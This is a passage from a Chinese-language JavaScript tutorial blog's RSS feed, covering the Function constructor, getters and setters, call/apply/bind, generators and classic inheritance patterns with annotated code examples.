    descriptor<span>.</span>value <span>=</span> <span>debounceFn</span><span>(</span>descriptor<span>.</span>value<span>,</span> wait<span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Function</title>
      <link>https://www.matrixtheone.ga/web/note/js/Function/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/Function/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Function</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-function-args-functionbody"> 1. Function(args..., functionBody)</h2>
<ul>
<li>构造函数创建匿名函数。前面参数会成为匿名函数的形参，最后一个参数会成为匿名函数的可执行体（Vue 中的 render 函数的形成方式）。</li>
</ul>
<div><pre><code><span>Function</span><span>(</span><span>"console.log('执行代码')"</span><span>)</span><span>(</span><span>)</span> <span>// => '执行代码'</span>

<span>Function</span><span>(</span><span>'name'</span><span>,</span> <span>'console.log(name)'</span><span>)</span><span>(</span><span>'徐扶墙'</span><span>)</span> <span>// => '徐扶墙'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_2-getter-setter"> 2. getter &amp; setter</h2>
<ul>
<li>
<p>获取/设置对象属性值时触发的函数。</p>
<blockquote>
<p>可以结合使用 getter 和 setter 来创建一个伪属性。不可能在具有真实值的属性上同时拥有一个 getter 或 setter 器（MDN）。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
  <span>harem</span><span>:</span> <span>[</span><span>]</span><span>,</span>
  <span>get</span> <span>firstWife</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>harem<span>[</span><span>0</span><span>]</span> <span>||</span> <span>'裆下有些忧郁呀！'</span>
  <span>}</span><span>,</span>
  <span>set</span> <span>marryWife</span><span>(</span><span>wife</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>harem<span>.</span><span>push</span><span>(</span>wife<span>)</span>
  <span>}</span><span>,</span>
<span>}</span>

foo<span>.</span>marryWife <span>=</span> <span>'姜泥'</span>
foo<span>.</span>marryWife <span>=</span> <span>'裴南苇'</span>
foo<span>.</span>firstWife <span>// => '姜泥'</span>
foo <span>// => {name: '徐扶墙', age: 17, harem: ['姜泥', '裴南苇']}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><h2 id="_3-new-target"> 3. new.target</h2>
<ul>
<li>new.target 属性允许你检测函数或构造方法是否是通过 new 运算符被调用的。</li>
</ul>
<div><pre><code><span>function</span> <span>Foo</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>new</span><span>.</span>target<span>)</span> <span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>'must be called with new'</span><span>)</span>
  <span>this</span><span>.</span>name <span>=</span> name
<span>}</span>

<span>Foo</span><span>(</span><span>)</span> <span>// => Uncaught Error: must be called with new</span>

<span>const</span> bar <span>=</span> <span>new</span> <span>Foo</span><span>(</span><span>'徐扶墙'</span><span>)</span> <span>// => {name: '徐扶墙'}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_4-arguments"> 4. arguments</h2>
<ul>
<li>保存所有传递的参数（是一个伪数组）。</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>arguments<span>)</span> <span>// => Arguments(2) ['徐扶墙', '裴南苇', length: 2]</span>
<span>}</span>

<span>foo</span><span>(</span><span>'徐扶墙'</span><span>,</span> <span>'裴南苇'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_5-call-this-arg-apply-this-arg-bind-this-arg"> 5. call(this, arg...) &amp; apply(this, [arg...]) &amp; bind(this, arg...)</h2>
<ul>
<li>
<p>第一个参数均为 this 的指向。call、bind 的参数传递通过逗号分割，apply 的参数通过数组传递。</p>
</li>
<li>
<p>bind 不会直接执行，会返回一个函数，参数可分别传递（bind 是柯里化函数）。</p>
</li>
<li>
<p>若 this 为 undefined 或 null，则指向全局。若为 [number | string | boolean]，则会隐式使用构造函数包裹后返回，俗称装箱。</p>
</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>say</span><span>(</span><span>arg1<span>,</span> arg2</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span><span>`</span><span><span>${</span><span>this</span><span>.</span>name<span>}</span></span><span>：</span><span><span>${</span>arg1<span>}</span></span><span><span>${</span>arg2<span>}</span></span><span><span>${</span>foo<span>.</span>name<span>}</span></span><span>！</span><span>`</span></span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>const</span> bar <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'裴南苇'</span><span>,</span>
<span>}</span>

foo<span>.</span><span>say</span><span>.</span><span>call</span><span>(</span>bar<span>,</span> <span>'天下'</span><span>,</span> <span>'第二'</span><span>)</span>
foo<span>.</span><span>say</span><span>.</span><span>apply</span><span>(</span>bar<span>,</span> <span>[</span><span>'天下'</span><span>,</span> <span>'第二'</span><span>]</span><span>)</span>
foo<span>.</span><span>say</span><span>.</span><span>bind</span><span>(</span>bar<span>,</span> <span>'天下'</span><span>)</span><span>(</span><span>'第二'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><ul>
<li>
<p>反柯里化函数。</p>
<blockquote>
<p>Function.prototype.call.apply(self, [obj, ...args]) 相当于 self.call(obj, ...args) 相当于 obj.self(...args)。转换到下方代码示意为 foo.push(6)。</p>
</blockquote>
<div><pre><code><span>Function</span><span>.</span>prototype<span>.</span><span>uncurrying</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>Function</span><span>.</span>prototype<span>.</span><span>call</span><span>.</span><span>apply</span><span>(</span>self<span>,</span> arguments<span>)</span>
  <span>}</span>
<span>}</span>

Array<span>.</span>push <span>=</span> <span>Array</span><span>.</span>prototype<span>.</span>push<span>.</span><span>uncurrying</span><span>(</span><span>)</span>

<span>const</span> foo <span>=</span> <span>{</span>
  <span>0</span><span>:</span> <span>4</span><span>,</span>
  <span>1</span><span>:</span> <span>3</span><span>,</span>
  <span>2</span><span>:</span> <span>9</span><span>,</span>
  <span>length</span><span>:</span> <span>3</span><span>,</span>
<span>}</span>

Array<span>.</span><span>push</span><span>(</span>foo<span>,</span> <span>6</span><span>)</span> <span>// foo: {0: 4, 1: 3, 2: 9, 3: 6, length: 4}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div></li>
</ul>
<h2 id="_6-generator"> 6. Generator</h2>
<ul>
<li>
<p>function* 这种声明方式（function 关键字后跟一个星号）会定义一个生成器函数 (generator function)，它返回一个 Generator 对象。生成器函数在执行时能暂停，后面又能从暂停处继续执行。</p>
<div><pre><code><span>function</span><span>*</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  <span>yield</span> <span>'jack'</span>
  <span>yield</span> <span>'pony'</span>
  <span>return</span> <span>'coderljw'</span>
<span>}</span>

<span>for</span> <span>(</span><span>const</span> res <span>of</span> <span>foo</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>res<span>)</span> <span>// 依次打印：'jack' -> 'pony'</span>

<span>function</span><span>*</span> <span>bar</span><span>(</span><span>)</span> <span>{</span>
  <span>yield</span><span>*</span> <span>foo</span><span>(</span><span>)</span>
  <span>yield</span> <span>'Evan You'</span>
  <span>yield</span> <span>'Dan'</span>
  <span>return</span> <span>'coderljw'</span>
<span>}</span>

<span>for</span> <span>(</span><span>const</span> res <span>of</span> <span>bar</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>res<span>)</span> <span>// 依次打印：'jack' -> 'pony' -> 'Evan You' -> 'Dan'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div></li>
<li>
<p>next。</p>
<div><pre><code><span>function</span><span>*</span> <span>foo</span><span>(</span><span>arg</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>arg<span>)</span> <span>// => 'nothing'</span>
  <span>const</span> Alibaba <span>=</span> <span>yield</span> <span>'jack'</span>
  console<span>.</span><span>log</span><span>(</span>Alibaba<span>)</span> <span>// => 'Alibaba'</span>
  <span>const</span> Tencent <span>=</span> <span>yield</span> <span>'pony'</span>
  console<span>.</span><span>log</span><span>(</span>Tencent<span>)</span> <span>// => 'Tencent'</span>
  <span>return</span> <span>'coderljw'</span>
<span>}</span>

<span>const</span> gen <span>=</span> <span>foo</span><span>(</span><span>'nothing'</span><span>)</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: 'jack', done: false}</span>
gen<span>.</span><span>next</span><span>(</span><span>'Alibaba'</span><span>)</span> <span>// => {value: 'pony', done: false}</span>
gen<span>.</span><span>next</span><span>(</span><span>'Tencent'</span><span>)</span> <span>// => {value: 'coderljw', done: true}</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: undefined, done: true}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div></li>
<li>
<p>return 会结束生成器函数。</p>
<div><pre><code><span>function</span><span>*</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> Alibaba <span>=</span> <span>yield</span> <span>'jack'</span>
  <span>const</span> Tencent <span>=</span> <span>yield</span> <span>'pony'</span>
  <span>return</span> <span>'coderljw'</span>
<span>}</span>

<span>const</span> gen <span>=</span> <span>foo</span><span>(</span><span>)</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: 'jack', done: false}</span>
gen<span>.</span><span>return</span><span>(</span><span>'Evan You'</span><span>)</span> <span>// => {value: 'Evan You', done: true}</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: undefined, done: true}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div></li>
<li>
<p>throw 会结束生成器函数并抛出错误，可用 try...catch 捕获错误。</p>
<ul>
<li>内部捕获。</li>
</ul>
<div><pre><code><span>function</span><span>*</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  <span>try</span> <span>{</span>
    <span>const</span> Alibaba <span>=</span> <span>yield</span> <span>'jack'</span>
  <span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span>err<span>)</span> <span>// => 4396</span>
  <span>}</span>
  <span>const</span> Tencent <span>=</span> <span>yield</span> <span>'pony'</span>
  <span>return</span> <span>'coderljw'</span>
<span>}</span>

<span>const</span> gen <span>=</span> <span>foo</span><span>(</span><span>)</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: 'jack', done: false}</span>
<span>const</span> res <span>=</span> gen<span>.</span><span>throw</span><span>(</span><span>'4396'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>res<span>)</span> <span>// => {value: 'pony', done: false}</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: 'coderljw', done: true}</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: undefined, done: true}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><ul>
<li>外部捕获。</li>
</ul>
<div><pre><code><span>function</span><span>*</span> <span>bar</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> Alibaba <span>=</span> <span>yield</span> <span>'jack'</span>
  <span>const</span> Tencent <span>=</span> <span>yield</span> <span>'pony'</span>
  <span>return</span> <span>'coderljw'</span>
<span>}</span>

<span>const</span> gen <span>=</span> <span>bar</span><span>(</span><span>)</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: 'jack', done: false}</span>
<span>try</span> <span>{</span>
  gen<span>.</span><span>throw</span><span>(</span><span>new</span> <span>Error</span><span>(</span><span>'2200'</span><span>)</span><span>)</span>
<span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>err<span>)</span> <span>// => Error: 2200</span>
<span>}</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: undefined, done: true}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div></li>
<li>
<p>实现状态机。</p>
<div><pre><code><span>function</span><span>*</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>yield</span> <span>'on'</span>
    <span>yield</span> <span>'off'</span>
  <span>}</span>
<span>}</span>

<span>const</span> gen <span>=</span> <span>foo</span><span>(</span><span>)</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: 'on', done: false}</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: 'off', done: false}</span>
gen<span>.</span><span>next</span><span>(</span><span>)</span> <span>// => {value: 'on', done: false}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div></li>
<li>
<p>搭配 Promise 函数（嘿嘿！另一种形式的组合函数）。</p>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>ms</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>_</span> <span>=></span> <span>resolve</span><span>(</span><span>4396</span><span>)</span><span>,</span> ms<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>function</span> <span>bar</span><span>(</span><span>ms</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>_</span> <span>=></span> <span>resolve</span><span>(</span><span>1557</span><span>)</span><span>,</span> ms<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>function</span><span>*</span> <span>hoge</span><span>(</span><span>promises<span>,</span> res</span><span>)</span> <span>{</span>
  <span>let</span> n <span>=</span> <span>0</span>
  <span>while</span> <span>(</span>n <span>&lt;</span> promises<span>.</span>length <span>&amp;&amp;</span> n <span>&lt;</span> <span>4</span><span>)</span> <span>{</span>
    res <span>=</span> <span>yield</span> promises<span>[</span>n<span>]</span><span>(</span>res<span>)</span>
    n<span>++</span>
  <span>}</span>

  <span>return</span> res
<span>}</span>

<span>function</span> <span>co</span><span>(</span><span>gen</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>function</span> <span>next</span><span>(</span><span>data</span><span>)</span> <span>{</span>
      <span>const</span> result <span>=</span> gen<span>.</span><span>next</span><span>(</span>data<span>)</span>
      <span>if</span> <span>(</span>result<span>.</span>done<span>)</span> <span>return</span> <span>resolve</span><span>(</span>result<span>.</span>value<span>)</span>
      result<span>.</span>value<span>.</span><span>then</span><span>(</span>
        <span>data</span> <span>=></span> <span>next</span><span>(</span>data<span>)</span><span>,</span>
        <span>err</span> <span>=></span> <span>reject</span><span>(</span>err<span>)</span>
      <span>)</span>
    <span>}</span>
    <span>next</span><span>(</span><span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>co</span><span>(</span><span>hoge</span><span>(</span><span>[</span>foo<span>,</span> bar<span>]</span><span>,</span> <span>2200</span><span>)</span><span>)</span><span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span> <span>// => 1557</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br></div></div></li>
</ul>
<h2 id="_7-继承"> 7. 继承</h2>
<ul>
<li>
<p>原型链继承。</p>
<blockquote>
<p>存在引用值共享问题。</p>
</blockquote>
<div><pre><code><span>function</span> <span>Super</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>harm <span>=</span> <span>[</span><span>4</span><span>,</span> <span>3</span><span>,</span> <span>9</span><span>]</span>
<span>}</span>
<span>Super</span><span>.</span>prototype<span>.</span><span>getHarm</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>this</span><span>.</span>harm
<span>}</span>

<span>function</span> <span>Sub</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>// 继承 Super</span>
<span>Sub</span><span>.</span>prototype <span>=</span> <span>new</span> <span>Super</span><span>(</span><span>)</span>

<span>const</span> clearlove7 <span>=</span> <span>new</span> <span>Sub</span><span>(</span><span>)</span>
<span>const</span> xiaohu <span>=</span> <span>new</span> <span>Sub</span><span>(</span><span>)</span>

clearlove7<span>.</span>harm<span>.</span><span>push</span><span>(</span><span>6</span><span>)</span>

clearlove7<span>.</span><span>getHarm</span><span>(</span><span>)</span> <span>// => [4, 3, 9, 6]</span>
xiaohu<span>.</span><span>getHarm</span><span>(</span><span>)</span> <span>// => [4, 3, 9, 6]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div></li>
<li>
<p>盗用构造函数继承（对象伪装/经典继承）。</p>
<blockquote>
<p>解决了引用值共享问题，但不能访问父类原型上的方法。</p>
</blockquote>
<div><pre><code><span>function</span> <span>Super</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>harm <span>=</span> <span>[</span><span>4</span><span>,</span> <span>3</span><span>,</span> <span>9</span><span>]</span>
<span>}</span>
<span>Super</span><span>.</span>prototype<span>.</span><span>getHarm</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>this</span><span>.</span>harm
<span>}</span>

<span>function</span> <span>Sub</span><span>(</span><span>)</span> <span>{</span>
  <span>Super</span><span>.</span><span>call</span><span>(</span><span>this</span><span>)</span>
<span>}</span>

<span>const</span> clearlove7 <span>=</span> <span>new</span> <span>Sub</span><span>(</span><span>)</span>
<span>const</span> xiaohu <span>=</span> <span>new</span> <span>Sub</span><span>(</span><span>)</span>

clearlove7<span>.</span>harm<span>.</span><span>push</span><span>(</span><span>6</span><span>)</span>

clearlove7<span>.</span><span>getHarm</span><span>(</span><span>)</span> <span>// => Uncaught TypeError</span>
xiaohu<span>.</span><span>getHarm</span><span>(</span><span>)</span> <span>// => Uncaught TypeError</span>
clearlove7<span>.</span>harm <span>// => [4, 3, 9, 6]</span>
xiaohu<span>.</span>harm <span>// => [4, 3, 9]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div></li>
<li>
<p>组合继承（伪经典继承）。</p>
<blockquote>
<p>弥补了原型链继承和盗用构造函数继承的不足，但存在效率问题，最主要的效率问题就是父类构造函数始终会被调用两次。</p>
</blockquote>
<div><pre><code><span>function</span> <span>Super</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>harm <span>=</span> <span>[</span><span>4</span><span>,</span> <span>3</span><span>,</span> <span>9</span><span>]</span>
<span>}</span>
<span>Super</span><span>.</span>prototype<span>.</span><span>getHarm</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>this</span><span>.</span>harm
<span>}</span>

<span>function</span> <span>Sub</span><span>(</span><span>)</span> <span>{</span>
  <span>// 初始化（ES6 super）</span>
  <span>Super</span><span>.</span><span>call</span><span>(</span><span>this</span><span>)</span> <span>// 第二次调用 Super()</span>
<span>}</span>
<span>// 继承原型</span>
<span>Sub</span><span>.</span>prototype <span>=</span> <span>new</span> <span>Super</span><span>(</span><span>)</span> <span>// 第一次调用 Super()</span>

<span>const</span> clearlove7 <span>=</span> <span>new</span> <span>Sub</span><span>(</span><span>)</span>
<span>const</span> xiaohu <span>=</span> <span>new</span> <span>Sub</span><span>(</span><span>)</span>

clearlove7<span>.</span>harm<span>.</span><span>push</span><span>(</span><span>6</span><span>)</span>

clearlove7<span>.</span><span>getHarm</span><span>(</span><span>)</span> <span>// => [4, 3, 9, 6]</span>
xiaohu<span>.</span><span>getHarm</span><span>(</span><span>)</span> <span>// => [4, 3, 9]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div></li>
<li>
<p>原型式继承。</p>
<blockquote>
<ul>
<li>2006 年，Douglas Crockford 写了一篇文章：<a href="https://www.crockford.com/javascript/prototypal.html" target="_blank" rel="noopener noreferrer">《JavaScript 中的原型式继承》</a>。本质上，object() 是对传入的对象执行了一次浅复制。</li>
<li>ECMAScript 5 通过增加 Object.create() 方法将原型式继承的概念规范化了。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>object</span><span>(</span><span>o</span><span>)</span> <span>{</span>
  <span>function</span> <span>F</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>F</span><span>.</span>prototype <span>=</span> o
  <span>return</span> <span>new</span> <span>F</span><span>(</span><span>)</span>
<span>}</span>

<span>const</span> Super <span>=</span> <span>{</span>
  <span>harm</span><span>:</span> <span>[</span><span>4</span><span>,</span> <span>3</span><span>,</span> <span>9</span><span>]</span><span>,</span>
<span>}</span>

<span>const</span> clearlove7 <span>=</span> <span>object</span><span>(</span>Super<span>)</span>
<span>const</span> xiaohu <span>=</span> <span>object</span><span>(</span>Super<span>)</span>

clearlove7<span>.</span>harm<span>.</span><span>push</span><span>(</span><span>6</span><span>)</span>

clearlove7<span>.</span>harm <span>// => [4, 3, 9, 6]</span>
xiaohu<span>.</span>harm <span>// => [4, 3, 9, 6]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div></li>
<li>
<p>寄生式继承。</p>
<blockquote>
<ul>
<li>寄生式继承背后的思路类似于寄生构造函数和工厂模式：创建一个实现继承的函数，以某种方式增强对象，然后返回这个对象。</li>
<li>寄生式继承同样适合主要关注对象，而不在乎类型和构造函数的场景。 object() 函数不是寄生式继承所必需的，任何返回新对象的函数都可以在这里使用。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>object</span><span>(</span><span>o</span><span>)</span> <span>{</span>
  <span>function</span> <span>F</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>F</span><span>.</span>prototype <span>=</span> o
  <span>return</span> <span>new</span> <span>F</span><span>(</span><span>)</span>
<span>}</span>

<span>function</span> <span>createAnother</span><span>(</span><span>original</span><span>)</span> <span>{</span>
  <span>// 通过调用函数创建一个新对象</span>
  <span>const</span> clone <span>=</span> <span>object</span><span>(</span>original<span>)</span>
  <span>// 以某种方式增强这个对象</span>
  clone<span>.</span><span>getHarm</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>harm<span>)</span>
  <span>}</span>
  <span>return</span> clone
<span>}</span>

<span>const</span> Super <span>=</span> <span>{</span>
  <span>harm</span><span>:</span> <span>[</span><span>4</span><span>,</span> <span>3</span><span>,</span> <span>9</span><span>]</span><span>,</span>
<span>}</span>

<span>const</span> clearlove7 <span>=</span> <span>createAnother</span><span>(</span>Super<span>)</span>
<span>const</span> xiaohu <span>=</span> <span>createAnother</span><span>(</span>Super<span>)</span>

clearlove7<span>.</span>harm<span>.</span><span>push</span><span>(</span><span>6</span><span>)</span>

clearlove7<span>.</span><span>getHarm</span><span>(</span><span>)</span> <span>// => [4, 3, 9, 6]</span>
xiaohu<span>.</span><span>getHarm</span><span>(</span><span>)</span> <span>// => [4, 3, 9, 6]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div></li>
<li>
<p>寄生式组合继承。</p>
<blockquote>
<ul>
<li>寄生式组合继承通过盗用构造函数继承属性，但使用混合式原型链继承方法。</li>
<li>寄生式组合继承可以算是引用类型继承的最佳模式。</li>
</ul>
</blockquote>
<div><pre><code><span>/*
Sub.prototype = Object.create(Super.prototype)
Sub.prototype.constructor = Sub

《JavaScript 高级程序设计（第四版）》写法，等同于上面两行代码。
  function object(o) {
    function F() {}
    F.prototype = o
    return new F()
  }

  function inheritPrototype(subType, superType) {
    const prototype = object(superType.prototype) // 创建对象
    prototype.constructor = subType // 增强对象
    subType.prototype = prototype // 赋值对象
  }

  inheritPrototype(Sub, Super)
*/</span>

<span>function</span> <span>Super</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>harm <span>=</span> <span>[</span><span>4</span><span>,</span> <span>3</span><span>,</span> <span>9</span><span>]</span>
<span>}</span>
<span>Super</span><span>.</span>prototype<span>.</span><span>getHarm</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>this</span><span>.</span>harm
<span>}</span>

<span>function</span> <span>Sub</span><span>(</span><span>)</span> <span>{</span>
  <span>// 初始化（ES6 super）</span>
  <span>Super</span><span>.</span><span>call</span><span>(</span><span>this</span><span>)</span>
<span>}</span>

<span>// 继承原型</span>
<span>Sub</span><span>.</span>prototype <span>=</span> Object<span>.</span><span>create</span><span>(</span><span>Super</span><span>.</span>prototype<span>)</span>
<span>// 纠正 constructor 指向</span>
<span>Sub</span><span>.</span>prototype<span>.</span>constructor <span>=</span> Sub

<span>const</span> clearlove7 <span>=</span> <span>new</span> <span>Sub</span><span>(</span><span>)</span>
<span>const</span> xiaohu <span>=</span> <span>new</span> <span>Sub</span><span>(</span><span>)</span>

clearlove7<span>.</span>harm<span>.</span><span>push</span><span>(</span><span>6</span><span>)</span>

